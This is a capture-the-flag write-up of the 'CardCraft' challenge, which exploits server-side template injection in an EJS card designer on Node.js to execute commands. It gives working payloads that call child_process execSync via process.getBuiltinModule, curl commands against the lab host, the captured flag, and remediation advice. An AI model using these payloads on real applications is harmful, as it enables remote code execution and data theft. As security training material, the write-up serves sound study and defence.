# CardCraft - server-side template injection (EJS / Node.js) → RCE

| | |
|---|---|
| **Challenge** | CardCraft |
| **Category** | INJ (ssti) |
| **Points / Difficulty** | 200 / hard |
| **Target** | http://inj6.chal.deti:8045 |
| **Bug** | CWE-94 - SSTI in a user-supplied EJS template (Node.js) |

## Hint
> A card for the buyer; the card keeps your design; the design keeps the house.

## Recon
`POST /card` with `recipient`, `message`, and **`design`** (a textarea holding
the whole EJS template, default `<%= recipient %> … <%= message %>`). The
user-supplied template is rendered server-side.

**Discriminator:** `design=<%= 1+2 %>` → **`3`** ⇒ EJS executes your template.
(EJS output tag is `<%= expr %>`; the engine identified via its chatty error page
+ the `<%= %>` syntax = EJS on Node.)

## Approach
EJS runs with the language's globals in scope but no module loader. Reach the
process object and ask it for the `child_process` builtin:
```
<%= process.getBuiltinModule('child_process').execSync('cat /flag/flag') %>
```
`process.getBuiltinModule` (Node 22+) returns a core module without `require`;
`execSync` returns the command output, which `<%= %>` writes into the card.

## Exploitation
```bash
curl -s --data-urlencode "recipient=x" --data-urlencode "message=y" \
  --data-urlencode "design=<%= 1+2 %>" http://inj6.chal.deti:8045/card            # -> 3
curl -s --data-urlencode "recipient=x" --data-urlencode "message=y" \
  --data-urlencode "design=<%= process.getBuiltinModule('child_process').execSync('cat /flag/flag') %>" \
  http://inj6.chal.deti:8045/card | grep -oE 'flag\{[^}]*\}'
```

## Flag
```
flag{04c1bbdf32623f96493fdf1222612418}
```

## For the report
- **Reaching a command-runner without a module loader:** `process` is a global;
  `process.getBuiltinModule('child_process')` hands back the core module (no
  `require` needed), then `.execSync('cmd')`. (Classic fallback:
  `process.mainModule.require('child_process').execSync`.)
- **Engine/runtime identified:** EJS on Node.js - from the `<%= %>` tags working
  and the verbose EJS compile error page on a bad expression.
- **Fix:** never render a **user-supplied template**. If "custom design" is a real
  feature, use a **true sandbox** with an allowlisted expression language (no
  `process`/`require`/globals). **Escaping the output is not a fix** - escaping
  protects the *data slots* from XSS, but here the *template itself* is attacker
  code and runs before any output escaping happens.

## Root cause & remediation
- **Cause:** the customer's template is compiled and executed (CWE-94) - "let the
  customer design their card" == "let the customer run code on the server."
- **Fix:** fixed template + data-only slots, or a sandboxed mini-language;
  least-privilege runtime; keep the flag off the app host.
